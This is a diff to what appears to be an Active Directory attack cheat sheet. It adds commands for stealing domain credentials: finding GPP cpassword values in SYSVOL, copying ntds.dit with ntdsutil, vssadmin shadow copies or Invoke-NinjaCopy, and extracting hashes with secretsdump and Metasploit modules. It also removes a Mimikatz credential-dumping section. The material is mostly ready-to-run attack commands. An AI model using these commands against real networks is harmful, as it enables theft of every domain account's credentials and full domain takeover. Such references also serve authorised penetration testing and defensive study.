@@ -18,7 +18,7 @@
     ```
   * Unconstrained Delegation (incl. pass-the-ticket)
   * OverPass-the-Hash (Making the most of NTLM password hashes)
-  * Pivoting with Local Admin & Passwords in SYSVOL
+  * GPO - Pivoting with Local Admin & Passwords in SYSVOL
     ```c
     findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
 
@@ -27,9 +27,16 @@
     Metasploit: scanner/smb/smb_enumshares
     Metasploit: windows/gather/enumshares
     Metasploit: windows/gather/credentials/gpp
+
+
+    /!\ GPO Priorization : Organization Unit > Domain > Site > Local
+    List all GPO for a domain :
+    Get-GPO -domaine DOMAIN.COM -all
+    Get-GPOReport -all -reporttype xml --all
     ```
   * Dangerous Built-in Groups Usage
-  * Dumping AD Domain Credentials
+
+  * Dumping AD Domain Credentials (%SystemRoot%\NTDS\Ntds.dit)
   ```c
   C:\>ntdsutil
   ntdsutil: activate instance ntds
@@ -38,11 +45,22 @@
   ifm: quit
   ntdsutil: quit
 
+  or
+
+  vssadmin create shadow /for=C :
+  Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit
+
+  then you need to use secretsdump to extract the hashes
   secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
 
   or
 
   Metasploit : windows/gather/credentials/domain_hashdump
+
+  or
+
+  PowerSploit : Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
   ```
   * Golden Tickets    
   Mimikatz version
@@ -87,13 +105,6 @@
   * BloodHound
   * RottenPotato
   * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
-
-## Mimikatz
-```
-load mimikatz
-mimikatz_command -f sekurlsa::logonPasswords full
-mimikatz_command -f sekurlsa::wdigest
-```
 
 ## PowerSploit
 ```
